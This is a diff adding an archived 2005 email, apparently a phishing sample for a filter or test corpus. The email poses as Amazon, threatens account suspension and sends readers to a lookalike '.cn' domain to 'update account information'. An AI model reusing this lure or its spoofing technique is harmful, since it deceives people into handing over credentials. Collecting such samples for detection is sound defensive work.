@@ -1,0 +1,67 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id A18612A88C
+ for <user@example.com>; Sun,  2 Oct 2005 02:31:28 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 977FA621C92; Sun,  2 Oct 2005 02:31:28 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 50CBF621C66
+ for <user@example.com>; Sun,  2 Oct 2005 02:31:28 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id CAA25611
+ for user@example.com; Sun, 2 Oct 2005 02:31:28 -0400
+Received: from ns1.ewdns.net (ns1.ewdns.net [62.70.6.81])
+ by mail.example.com with ESMTP id CAA25603
+ for <user@example.com>; Sun, 2 Oct 2005 02:31:27 -0400
+Received: from nobody by ns1.ewdns.net with local (Exim 4.52)
+ id 1ELxNb-0001jl-OU
+ for user@example.com; Sun, 02 Oct 2005 08:31:23 +0200
+To: user@biochemistry.BIOC.cwru.edu
+Subject: Amazon.com Inquiry
+From: Amazon <service@amazon.com>
+MIME-Version: 1.0
+Content-Type: text/plain
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1ELxNb-0001jl-OU@ns1.ewdns.net>
+Date: Sun, 02 Oct 2005 08:31:23 +0200
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - ns1.ewdns.net
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 500] / [47 12]
+X-AntiAbuse: Sender Address Domain - ns1.ewdns.net
+X-Source-Args: /usr/local/apache/bin/httpd -DSSL 
+X-Source-Dir: partyfactory.no:/public_html/karaoke/images/products
+Content-Length: 1086
+Lines: 24
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 178
+
+Dear Amazon member, 
+
+Due to concerns we have for the safety and integrity of the Amazon community we have issued this warning. 
+
+Per the User Agreement, Section 9, we may immediately issue a warning, temporarily suspend, indefinitely suspend or terminate your membership and refuse to provide our services to you if we believe that your actions may cause financial loss or legal liability for you, our users or us. We may also take these actions if we are unable to verify or authenticate any information you provide to us. 
+
+Please follow the link below: 
+
+http://www.amazon.com.encrypted-inquiry.cn?/exec/obidos
+
+and update your account information. 
+
+We apreciate your support and understanding, as we work together to keep Amazon market a safe place to trade. 
+
+Thank you for your attention on this serious matter.
+
+Regards,
+Amazon Safety Department
+
+
+NOTE: This message was sent to you by an automated e-mail system. Please don't reply to it. Amazon treats your personal information with the utmost care, and our Privacy Policy is designed to protect you and your information.
+
+
+
